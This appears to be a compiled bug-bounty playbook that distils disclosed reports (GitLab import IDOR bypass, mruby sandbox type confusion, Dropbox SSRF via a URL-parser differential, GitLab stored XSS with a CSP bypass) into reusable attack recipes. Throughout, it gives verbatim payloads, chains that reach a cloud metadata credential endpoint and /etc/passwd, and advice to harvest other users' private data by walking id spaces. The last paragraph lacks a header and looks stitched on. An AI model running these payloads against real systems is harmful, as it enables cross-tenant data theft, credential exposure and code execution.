CLASS: IDOR / BOLA in an import path — nested `attributes` sub-hash defeats a top-level `_ids` denylist (CWE-639 + CWE-915) — GitLab "Private objects exposed through project import" (bypass of #743953)
CORE METHOD:
  1. Same primitive as #743953: GitLab's project-import restorer does `@project.assign_attributes(project_params)` where `project_params` come straight from the attacker-authored `project.json` inside the import tarball.
  2. The fix for #743953 blocks all top-level relation-id keys (`issue_ids`, `merge_request_ids`, `board_ids`, `note_ids`, ...). The bypass (verbatim from the report) is to move the key ONE LEVEL DOWN into the model's bulk-attributes writer, which the denylist never inspects:
     # project.json
     "attributes": {
         "issue_ids": [ 29279725 ],
         "description": "Set from attributes[description]"
     }
  3. `attributes` is the Rails `assign_attributes`/`attributes=` container, so `attributes["issue_ids"]` reaches the same mass-assignment path the top-level filter was meant to close. The id array names the VICTIM's pre-existing object while the corresponding payload array stays empty — that is what makes it an IDOR and not a copy.
  4. Import the tarball as a "GitLab export" into your own namespace, let the job finish, open the Issues tab: the imported project now owns a private issue belonging to another user (still credited to its original author).
  5. Ids are incremental → walk the id space to harvest private issues/MRs/boards/notes in bulk ("accessing random resources of other users by traversing the incremental ID space"); affects gitlab.com and self-hosted.
DETECTION SIGNAL: any import/restore/upsert/duplicate feature that bulk-assigns manifest attributes onto a model AND accepts a nested container (`attributes`, `data`, `record`, `properties`, `meta`) in that same manifest; a denylist/permitted-parameter list applied only at the TOP level while the model still exposes a bulk `attributes=`/`assign_attributes` writer; relation-id keys present with empty payload arrays alongside them.
CHAIN: any authenticated user who can import a project → `attributes.issue_ids` in `project.json` bypasses the top-level `_ids` denylist → `assign_attributes` re-binds your project to another user's private objects → cross-tenant read of private issues / MRs / boards / notes at scale (Critical, $20,000; the previous fix was cosmetic).
TRANSFERABLE TEST: Take the app's recently-patched mass-assignment denylist and re-submit the same forbidden key NESTED one level deeper — `{"attributes": {"<forbidden_key>": ...}}`, then `data`/`record`/`properties`/`meta` variants — in the import manifest or JSON body. If the field/relation is still written, the fix was cosmetic. Then walk the target relation's id space (ids are usually sequential) to confirm cross-tenant reach.

CLASS: sandbox escape → code execution via type confusion from RUNTIME CONSTANT LOOKUP of a struct-backed class (mruby / Shopify Scripts)
CORE METHOD:
  1. mruby backs core objects with fixed C structs (`RStruct`, `RRange`, `RDecimal`) but resolves the class object by RUNTIME CONSTANT LOOKUP at allocation time instead of a cached class pointer, and never verifies that the constant still points at the struct-backed class.
  2. The untrusted script reassigns a core constant, so the lookup yields a DIFFERENT class and the C struct's fields are reinterpreted as that class's generic slots. Sibling report 181910 states it verbatim: "`mrb_range_new` … uses runtime constant lookup to find the `Range` class object. Redefining the `Range` constant … causes a segfault, as the `RRange::edges` field is confused for the `iv` field on other structs" — payload `Range = Array; (1..2).inspect`; 185051 does the same for Decimal: `olddecimal = Decimal.new(1); Decimal = Hash; a = -olddecimal` → "memory corruption or arbitrary code execution".
  3. Same pattern with `Struct` (this report): the PoC script drives mruby to jump to `0x0000133713371337` — an attacker-chosen instruction pointer — and segfault, i.e. full IP control out of a struct/iv field confusion.
  4. The report states the crash is only the PoC's endpoint: "it would almost certainly be possible to achieve full remote code execution, especially given an arbitrary read/write primitive (which is easily created using the same techniques as in the proof of concept)". Reachable because the sandbox shares a process with the host runtime and other tenants.
DETECTION SIGNAL: an embedded/sandboxed interpreter that resolves built-in classes by constant lookup at allocation (`mrb_class_get`, `const_get`, `getClass`) while the untrusted language may reassign class constants or globals; native structs whose fields get reinterpreted as generic "instance variable" slots of another class; reassignable struct-backed classes (`Struct`, `Range`, `Decimal`/`BigDecimal`, `Set`, `Time`); a crash whose fault address is CONTROLLED (e.g. 0x133713371337) rather than null.
CHAIN: untrusted script inside the sandbox → reassign a core class constant (`Struct` / `Range` / `Decimal`) → allocation-time constant lookup returns the wrong class → struct field ↔ iv slot type confusion → controlled pointer deref (arbitrary read/write) + instruction-pointer control → native code execution escaping the script sandbox into the shared host process (Critical, $18,000).
TRANSFERABLE TEST: In any sandboxed/embedded interpreter, reassign a built-in class constant to another class and then execute the construct that ALLOCATES it (`Range = Array; (1..2).inspect`, `Decimal = Hash; -decimal`, `Struct` variants, `Set`, `Time`). A crash alone is a DoS — but if the fault address is one you CHOSE, or you can leak a controlled address with a second confusion (cf. genuine sibling report 207321 "Controlled address leak due to type confusion – ASLR bypass"), the struct/iv layout is confused and the path continues to fake-object read/write → RCE. Escalate before filing; do not report the DoS.

CLASS: SSRF (full-response) via URL-parser differential between the validating library and the fetching library (CWE-918 + CWE-436) — Dropbox branded sharing
CORE METHOD:
  1. Entry point: a team-admin feature that fetches an image server-side from a client-supplied URL — `POST /team/admin/team_logo/save` (and `/team/admin/team_background/save`) with an `img_url` argument; the server then runs curl/pycurl on that URL.
  2. The vulnerable code validates the AUTHORITY with one parser and fetches with another:
     parsed_url = URI.parse(img_url)
     if BLOCK_CLUSTER != parsed_url.authority: raise HttpStatusBadRequestException()
     conn, url = CurlConnection.build_connection_url(img_url)
     response = conn.perform("GET", url)
     `URI` is Dropbox's own RFC-3986-regex parser; `CurlConnection.build_connection_url` uses Python's `urllib.parse` (urlsplit).
  3. Parser-differential payload: `https://dl-web.dropbox.com\@127.0.0.1:8080`. `URI.parse(...).authority` → `'dl-web.dropbox.com'` (the allowlist check PASSES) while `urlsplit(...).hostname` → `'127.0.0.1'` (curl connects to the attacker-chosen/internal host). The backslash before `@` is the differential character — same family as the 2017 Black Hat "A New Era of SSRF — Exploiting URL Parser in Trending Programming Languages" talk the vendor cites.
  4. FULL-READ: the fetched body is SAVED server-side (into a database) and served back — `GET https://www.dropbox.com/team/team_logo/<dbtid>` or `https://www.dropbox.com/team/team_background/<dbtid>` returns the internal response body, so this is a complete-response SSRF (not blind) and that download endpoint is the exfil channel.
  5. Vendor-observed impact limit (why this is graded, not assumed): most Dropbox internal services speak gRPC with mTLS constraints, so a plain GET cannot reach them. Fixed in ~8 hours.
  6. The vendor fix is the reusable mitigation to test a target against: normalize by serializing through the validating parser (`safe_url = str(parsed_url)`, reject on exception) and fetch THAT string; better still, construct the URL from parsed components instead of trusting the raw input.
DETECTION SIGNAL: any client-supplied URL fetched server-side where validation and fetch are performed by DIFFERENT libraries (own URI class vs urllib/curl/requests; java.net.URI vs HttpClient; urlsplit vs httpx); allowlist checks on `authority`/`host`/`urlparse().netloc` while the actual connect uses another parse; the fetched body persisted and retrievable elsewhere (logo/avatar import, "import from URL", link unfurl, PDF/preview generator, webhook tester, upstream fetch of any kind) → full-read SSRF.
CHAIN: team admin (low privilege, but any user-reachable URL-fetch works) → `img_url = https://<allowed-host>\@<internal-host>:<port>` → validator passes, curl fetches the internal host → response body stored → read back from the team-logo/background URL → internal service data / credential exposure; with a reachable metadata endpoint the same primitive escalates to cloud IAM credentials → RCE (Critical; $17,576 vendor-paid / $27,000 vendor-assessed).
TRANSFERABLE TEST: For every server-side fetch of a user-supplied URL, send `<allowed-host>\@<attacker-or-internal-host>:<port>` plus the variant table — `%5c@`, `\@`, mixed case, `@` in path/query, userinfo tricks (`https://allowed@internal`), trailing dot/IDN host — and check (a) whether your collaborator or the internal address receives the request and (b) whether the fetched BODY is retrievable from a second endpoint (that read-back is what makes it full-response, i.e. P1/P2 instead of blind). Then probe `http://127.0.0.1:<port>/` and `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

CLASS: stored XSS with CSP bypass — unescaped upload FILENAME interpolated into an HTML attribute by a link-reference builder + multipart-sanitizer bypass via RFC 2231 `filename*` + an unescaped HTML re-emit path (CWE-79 / CWE-116) — GitLab DesignReferenceFilter
CORE METHOD:
  1. The design link-reference pattern validates the filename with `valid_char = %r{[^/\s]}` — "any char that is not a forward slash or whitespace" — so `"` and `'` are ACCEPTED into a filename that is later used as a URL.
  2. `parse_symbol` takes `match_data[:url_filename]` verbatim (`Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)`), and `AbstractReferenceFilter#object_link_filter` builds the anchor by STRING INTERPOLATION: `%(<a href="#{url}" #{data} title="#{...}" class="#{...}">#{content}</a>)`. A quote in the filename breaks out of `href`.
  3. Sanitizer bypass — uploads normally pass through Workhorse + `CarrierWave::SanitizedFile`, which strip odd characters. Skip Workhorse with an RFC 2231 filename parameter in the multipart part:
     Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png
     The design is stored with the raw filename `bbb"class="gfm"a='.png` (only `/` and whitespace remain forbidden, so it still works inside the link URL).
  4. Turn attribute injection into markup: include the attributes `ReferenceRedactor` requires (`data-design`, `data-issue`, `data-reference-type="design"`, `data-link-reference="true"`) and put the payload HTML as the link's inner content; `redacted_node_content` then re-emits `%(<a href="#{href}">#{content}</a>)` using the attacker-controlled `data-original` value UNESCAPED → arbitrary HTML in the rendered page:
     <a href='https://gitlab.com/<ns>/<proj>/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
     ' data-design="1" data-issue="1" data-reference-type="design" data-original="
       &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
     "
     </a>
  5. CSP bypass without inline JS: the googleapis JSONP endpoint is allowlisted; `callback=setTimeout` makes the JSONP response CALL `setTimeout` with the `q` value as code → the JS runs. `; //` truncates the trailing JSONP JSON.
  6. Impact: markdown renders on issues, comments, MRs, etc. → stored XSS on every markdown surface, usable to exfiltrate API tokens and take over accounts (the report itself chains to #1122227 token theft).
DETECTION SIGNAL: a filename or display value interpolated into HTML by string concatenation instead of escaped (link builders, mention/reference/autolink filters, `<a href="#{...}">`); a validation char class that excludes only `/` and whitespace (`[^/\s]`) where the value later becomes a URL/attribute; an upload pipeline whose sanitizer can be skipped via `filename*=` (RFC 2231), a unicode/encoded filename, or a direct-to-storage path; a "redact/re-render" pass that re-emits stored attributes with different (weaker) escaping than the first render; a CSP that allowlists a JSONP-capable CDN and where a global callback sink exists (`setTimeout`, `alert`, `$.getJSON`, `angular.callbacks`).
CHAIN: any user able to upload a file on a markdown-capable app → filename containing `"`/`'` delivered via `filename*=` (Workhorse/CarrierWave sanitizer bypassed) → link-reference builder interpolates it unescaped → break out of `href`, inject arbitrary attributes → reference redactor re-emits the attacker's `data-original` unescaped → arbitrary HTML → JSONP from an allowlisted CDN + `setTimeout` callback executes JS under CSP → stored XSS on every markdown surface → API-token exfiltration / account takeover (Critical 9.6, $16,000).
TRANSFERABLE TEST: Upload a file whose NAME contains `"` and `'`, sending the multipart part as `filename*=ASCII-8BIT''x%22y%27.png` to dodge the middleware sanitizer (also try a raw `filename="a\"b.png"` and unicode escapes). Reference that file in a post/comment/issue and read the generated HTML — an unescaped quote inside `href` proves attribute injection. Escalate through the app's own re-render/redaction path (`data-original`, `data-text`, tooltips) and, if CSP blocks inline script, look for an allowlisted host exposing JSONP plus a global callback sink.

TRANSFERABLE TEST: In any feature that validates, loads or previews a document you control, place a reference where a scalar is expected — `"$ref": "file:///etc/passwd"`, an absolute path, a bare `http://<your-collaborator>/x`, `gopher://`, `dict://` — and watch for (a) your collaborator being hit (SSRF) or (b) file content appearing in an error, job log, or status endpoint. Then find the import/validation STATUS endpoint that reflects the fetched data; a small byte cap is message truncation, not a mitigation — loop with different targets and offsets.
